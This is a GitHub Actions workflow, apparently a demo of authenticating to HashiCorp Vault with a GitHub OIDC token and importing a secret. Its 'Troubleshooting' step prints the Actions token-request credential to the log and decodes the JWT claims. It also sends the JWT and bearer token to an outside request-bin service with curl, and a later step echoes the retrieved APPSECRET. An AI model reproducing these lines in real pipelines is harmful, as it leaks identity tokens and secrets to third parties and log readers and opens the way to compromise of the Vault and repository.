name: HashiCorpDemo_myraprojectrepo
on:
  push:
    branches:
      - main
    paths-ignore:
      - '*.xx'
jobs:
  get-secret:
    permissions:
      contents: 'read'
      id-token: 'write'
    runs-on: ubuntu-latest
    name: get-secret
    steps:
      - name: Troubleshooting_1
        run: |
            curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | \
            jq "{ jwt: .value, role: \"auth.jwt.app1.workflow1_role\" }" > ./token.json
              
            echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN = [$ACTIONS_ID_TOKEN_REQUEST_TOKEN] and ACTIONS_ID_TOKEN_REQUEST_URL = [$ACTIONS_ID_TOKEN_REQUEST_URL]"
            echo 'GitHub Actions Token Claims'
            cat ./token.json | jq -r '.jwt | split(".") | .[1] | @base64d' | jq > secrets.json
            cat secrets.json
            cat ./token.json
            curl -i -H "Accept: application/json" -H "Content-Type: application/json" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" --data @token.json https://reqbin.netlify.app/.netlify/functions/reqbin
            echo 'Vault Login Response'
            curl -sSLf -X POST -H "Content-Type: application/json" -H "X-Vault-Namespace: admin" --data @token.json https://ra-vault-cluster-public-vault-193294ff.3b9e56d2.z1.hashicorp.cloud:8200/v1/auth/jwt-github-actions/login
            echo ./token.json
            # Remove the token file when we're done (if we don't fail )
            rm ./token.json
      - name: Export JSON File
        run: |
          # Example: Move the file to another location or make it available for download
          cat secrets.json
      - name: Import Secrets
        id: import-secrets
        uses: hashicorp/vault-action@v3.3.0
        with:
          url: https://ra-vault-cluster-public-vault-193294ff.3b9e56d2.z1.hashicorp.cloud:8200
          path: jwt-github-actions
          role: auth.jwt.app1.workflow1_role
          method : jwt
          exportToken: true
          exportEnv: true
          namespace: admin
          secrets: |
            myraproject/data/test secretkey | APPSECRET ;
      - name: Step following 'Import Secrets'
        run: |
          $APPSECRET = "${{ env.APPSECRET }}"
          echo "Stored Output: $APPSECRET"
